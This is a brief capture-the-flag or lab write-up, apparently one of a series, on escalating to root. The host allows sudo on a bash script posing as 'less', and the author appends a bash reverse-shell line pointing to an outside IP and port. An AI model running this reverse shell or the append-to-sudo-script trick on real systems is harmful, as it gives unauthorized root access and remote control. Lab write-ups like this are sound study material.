# Priv-Esc - II

sudo -l

```
(ALL) /usr/local/bin/less
```
Trying GTFO gave us an unexpected output.


Looks like `/usr/local/bin/less` is an executable written in bash and is immutable means can't be overwritten. But appending is allowed. Let's try that.

echo 'bash -i >& /dev/tcp/10.8.107.21/1234 0>&1' >> /usr/local/bin/less and we are root!
